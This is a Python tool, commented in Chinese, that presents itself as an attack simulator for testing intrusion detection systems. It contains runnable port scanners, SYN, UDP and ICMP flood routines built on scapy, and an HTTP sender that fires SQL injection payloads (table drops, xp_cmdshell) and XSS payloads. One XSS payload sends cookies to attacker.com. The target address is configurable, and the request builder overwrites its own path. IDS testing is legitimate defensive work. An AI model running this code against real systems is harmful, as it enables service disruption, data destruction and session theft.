#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击模拟脚本 - 用于测试入侵检测系统
模拟多种攻击类型：端口扫描、DoS攻击、SQL注入和XSS攻击
"""

import socket
import threading
import time
import random
import argparse
import http.client
from urllib.parse import quote
import urllib.parse
import sys
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sr1

# 全局变量
TARGET_IP = "127.0.0.1"  # 默认目标IP
ATTACK_DURATION = 10     # 默认攻击持续时间(秒)
ATTACK_INTENSITY = 10    # 默认攻击强度(每秒包数)
INTERFACE = None         # 网络接口

# SQL注入攻击载荷
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT username, password FROM users--",
    "admin' --",
    "1'; DROP TABLE users--",
    "1' OR '1' = '1' UNION SELECT null, version() --",
    "' OR username LIKE '%admin%",
    "'; EXEC xp_cmdshell('net user');--",
    "' UNION SELECT @@version, NULL--",
    "' OR '1'='1'; INSERT INTO logs VALUES('hacked')--"
]

# XSS攻击载荷
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(`XSS`)'>",
    "'\"><script>alert(document.cookie)</script>",
    "<img src=x onerror=eval('al'+'ert(\"XSS\")')>",
    "<div onmouseover='alert(\"XSS\")'>XSS触发</div>",
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
]

def print_banner():
    """打印工具横幅"""
    banner = """
    ╔═══════════════════════════════════════════════════╗
    ║                攻击模拟工具 v1.0                  ║
    ║        用于测试入侵检测系统的有效性              ║
    ╚═══════════════════════════════════════════════════╝
    
    支持的攻击类型:
    1. 端口扫描
    2. DoS攻击
    3. SQL注入攻击
    4. XSS攻击
    """
    print(banner)

def get_local_ip():
    """获取本机IP地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def port_scan(target_ip, start_port=1, end_port=1000, scan_type="TCP"):
    """
    执行端口扫描攻击
    
    参数:
        target_ip: 目标IP地址
        start_port: 起始端口
        end_port: 结束端口
        scan_type: 扫描类型 (TCP, SYN, UDP)
    """
    print(f"[*] 开始对 {target_ip} 进行{scan_type}端口扫描 ({start_port}-{end_port})...")
    
    open_ports = []
    
    if scan_type == "TCP":
        # TCP连接扫描
        for port in range(start_port, end_port + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"[+] 端口 {port}/tcp 开放")
                sock.close()
            except:
                pass
    
    elif scan_type == "SYN":
        # SYN扫描 (使用scapy)
        for port in range(start_port, end_port + 1):
            try:
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                response = sr1(packet, timeout=0.1, verbose=0)
                if response and response.haslayer(TCP) and response[TCP].flags == 0x12:  # SYN-ACK
                    open_ports.append(port)
                    print(f"[+] 端口 {port}/tcp 开放")
                    # 发送RST包关闭连接
                    send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)
            except:
                pass
    
    elif scan_type == "UDP":
        # UDP扫描
        for port in range(start_port, end_port + 1):
            try:
                packet = IP(dst=target_ip)/UDP(dport=port)
                response = sr1(packet, timeout=0.1, verbose=0)
                if response is None:
                    open_ports.append(port)
                    print(f"[+] 端口 {port}/udp 可能开放")
            except:
                pass
    
    print(f"[*] 扫描完成，发现 {len(open_ports)} 个开放端口")
    return open_ports

def dos_attack(target_ip, target_port=80, duration=10, pps=100, attack_type="SYN"):
    """
    执行DoS攻击
    
    参数:
        target_ip: 目标IP地址
        target_port: 目标端口
        duration: 攻击持续时间(秒)
        pps: 每秒发包数
        attack_type: 攻击类型 (SYN, UDP, ICMP)
    """
    print(f"[*] 开始对 {target_ip}:{target_port} 进行 {attack_type} DoS攻击 (持续{duration}秒，{pps}包/秒)...")
    
    end_time = time.time() + duration
    packet_count = 0
    
    while time.time() < end_time:
        try:
            if attack_type == "SYN":
                # SYN洪水攻击
                packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
                send(packet, verbose=0)
            
            elif attack_type == "UDP":
                # UDP洪水攻击
                packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(b"X" * 1024)
                send(packet, verbose=0)
            
            elif attack_type == "ICMP":
                # ICMP洪水攻击
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=0)


            packet_count += 1
            
            # 控制发包速率
            if packet_count % pps == 0:
                time.sleep(1)
        
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] 攻击过程中出错: {e}")
            break
    
    print(f"[*] DoS攻击完成，共发送 {packet_count} 个数据包")


def http_attack(target_ip, target_port=8000, attack_type="SQLI", payloads=None, count=10):
    """
    执行HTTP攻击 (SQL注入或XSS)

    参数:
        target_ip: 目标IP地址
        target_port: 目标端口
        attack_type: 攻击类型 (SQLI, XSS)
        payloads: 攻击载荷列表
        count: 攻击次数
    """
    if attack_type == "SQLI":
        attack_name = "SQL注入"
        if payloads is None:
            payloads = SQL_INJECTION_PAYLOADS
    else:
        attack_name = "XSS"
        if payloads is None:
            payloads = XSS_PAYLOADS

    print(f"[*] 开始对 {target_ip}:{target_port} 进行 {attack_name} 攻击...")

    # 定义可能的SQL注入目标路径
    sql_injection_paths = [
        "/login",
        "/admin",
        "/user",
        "/search",
        "/query",
        "/api/users"
    ]

    for i in range(count):
        try:
            payload = random.choice(payloads)
            encoded_payload = urllib.parse.quote(payload)

            # 根据攻击类型构造不同的请求
            if attack_type == "SQLI":
                # 随机选择一个路径
                path = random.choice(sql_injection_paths)
                # 随机选择GET或POST方法
                method = random.choice(["GET", "POST"])

                if method == "GET":
                    # 构造GET请求，使用不同的参数名
                    param = random.choice(["id", "user_id", "username", "search", "query"])
                    path = f"{path}?{param}={encoded_payload}"
                    body = ""
                else:
                    # 构造POST请求
                    body = f"username={encoded_payload}&password=test"
            else:
                # XSS攻击保持不变
                path = f"/?q={encoded_payload}"
                method = "GET"
                body = ""

            # URL encode payload
            encoded_payload = quote(payload)

            # 构造请求路径（GET 请求示例）
            param = random.choice(["id", "user_id", "username", "search", "query"])
            path = f"/login?{param}={encoded_payload}&password=test"

            # 构造 HTTP 请求报文
            http_request = f"{method} {path} HTTP/1.1\r\n"
            http_request += f"Host: {target_ip}\r\n"
            http_request += "User-Agent: Mozilla/5.0\r\n"
            http_request += "Accept: */*\r\n"
            if method == "POST":
                http_request += "Content-Type: application/x-www-form-urlencoded\r\n"
                http_request += f"Content-Length: {len(body)}\r\n"
            http_request += "Connection: close\r\n\r\n"
            if body:
                http_request += body

            # 打印请求调试信息
            print(f"[DEBUG] 发送HTTP请求:\n{http_request}")

            # 发送请求
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.send(http_request.encode())

            # 接收响应
            response = b""
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass
            sock.close()

            # 检查响应内容
            response_str = response.decode('utf-8', errors='ignore').lower()
            sql_error_signs = [
                "sql syntax",
                "mysql error",
                "ora-",
                "sql error",
                "postgresql error",
                "sqlite error"
            ]

            if any(sign in response_str for sign in sql_error_signs):
                print(f"[+] SQL注入可能成功! ({i + 1}/{count}): {payload}")
            else:
                print(f"[+] 发送 {attack_name} 载荷 ({i + 1}/{count}): {payload}")
        except Exception:
            pass

    print(f"[*] {attack_name}攻击完成，共发送 {count} 个请求")

def simulate_http_server(port=8000):
    """
    模拟一个简单的HTTP服务器，用于接收攻击请求
    """
    try:
        from http.server import HTTPServer, SimpleHTTPRequestHandler
        
        class CustomHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h1>Test Server</h1></body></html>")
                print(f"[*] 收到HTTP请求: {self.path}")
        
        server = HTTPServer(('', port), CustomHandler)
        print(f"[*] 启动HTTP服务器在端口 {port}")
        
        # 在新线程中启动服务器
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return server
    
    except Exception as e:
        print(f"[!] 启动HTTP服务器失败: {e}")
        return None

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="攻击模拟工具 - 用于测试入侵检测系统")
    
    parser.add_argument("-t", "--target", default=TARGET_IP, help="目标IP地址")
    parser.add_argument("-p", "--port", type=int, default=80, help="目标端口")
    parser.add_argument("-a", "--attack", choices=["portscan", "dos", "sqli", "xss", "all"], required=True, help="攻击类型")
    parser.add_argument("-d", "--duration", type=int, default=ATTACK_DURATION, help="攻击持续时间(秒)")
    parser.add_argument("-i", "--intensity", type=int, default=ATTACK_INTENSITY, help="攻击强度(每秒包数)")
    parser.add_argument("--start-port", type=int, default=1, help="端口扫描起始端口")
    parser.add_argument("--end-port", type=int, default=1000, help="端口扫描结束端口")
    parser.add_argument("--scan-type", choices=["TCP", "SYN", "UDP"], default="TCP", help="端口扫描类型")
    parser.add_argument("--dos-type", choices=["SYN", "UDP", "ICMP"], default="SYN", help="DoS攻击类型")
    parser.add_argument("--http-server", action="store_true", help="启动模拟HTTP服务器")
    parser.add_argument("--server-port", type=int, default=8000, help="HTTP服务器端口")
    
    args = parser.parse_args()
    
    print_banner()
    
    # 获取本机IP
    local_ip = get_local_ip()
    print(f"[*] 本机IP地址: {local_ip}")
    
    # 启动HTTP服务器
    server = None
    if args.http_server:
        server = simulate_http_server(args.server_port)
        if not server:
            print("[!] 无法启动HTTP服务器，继续执行其他攻击...")
    
    # 执行攻击
    try:
        if args.attack == "portscan" or args.attack == "all":
            port_scan(args.target, args.start_port, args.end_port, args.scan_type)
        
        if args.attack == "dos" or args.attack == "all":
            dos_attack(args.target, args.port, args.duration, args.intensity, args.dos_type)
        
        if args.attack == "sqli" or args.attack == "all":
            http_attack(args.target, args.port, "SQLI", count=args.intensity)
        
        if args.attack == "xss" or args.attack == "all":
            http_attack(args.target, args.port, "XSS", count=args.intensity)
    
    except KeyboardInterrupt:
        print("\n[!] 用户中断，停止攻击")
    
    # 如果启动了HTTP服务器，保持运行一段时间
    if server:
        try:
            print("[*] HTTP服务器正在运行，按Ctrl+C停止...")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 停止HTTP服务器")
    
    print("[*] 攻击模拟完成")

if __name__ == "__main__":
    main()
